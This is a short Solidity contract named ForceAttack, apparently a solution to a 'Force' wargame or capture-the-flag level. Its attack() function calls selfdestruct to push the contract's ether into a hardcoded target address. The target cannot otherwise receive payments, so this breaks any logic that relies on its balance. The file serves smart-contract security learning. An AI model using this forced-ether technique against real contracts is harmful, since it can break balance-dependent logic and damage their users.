// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    address payable ForceContractAddress = 0xCbAFeA16ce76119DAA6Bc9367f55Ea1308c3Fd8a;
    receive() external payable {}

    function attack() external {
        selfdestruct(ForceContractAddress);
    }
}